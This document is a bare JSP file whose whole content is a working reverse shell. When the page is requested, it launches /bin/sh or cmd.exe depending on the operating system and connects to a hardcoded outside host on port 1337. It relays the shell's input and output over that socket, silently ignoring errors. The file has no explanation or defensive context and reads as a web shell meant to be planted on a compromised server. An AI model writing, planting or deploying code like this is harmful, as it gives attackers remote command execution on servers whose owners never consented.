<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream tE;
    OutputStream wg;

    StreamConnector( InputStream tE, OutputStream wg )
    {
      this.tE = tE;
      this.wg = wg;
    }

    public void run()
    {
      BufferedReader wC  = null;
      BufferedWriter pgx = null;
      try
      {
        wC  = new BufferedReader( new InputStreamReader( this.tE ) );
        pgx = new BufferedWriter( new OutputStreamWriter( this.wg ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = wC.read( buffer, 0, buffer.length ) ) > 0 )
        {
          pgx.write( buffer, 0, length );
          pgx.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( wC != null )
          wC.close();
        if( pgx != null )
          pgx.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "vmi850151.contaboserver.net", 1337 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
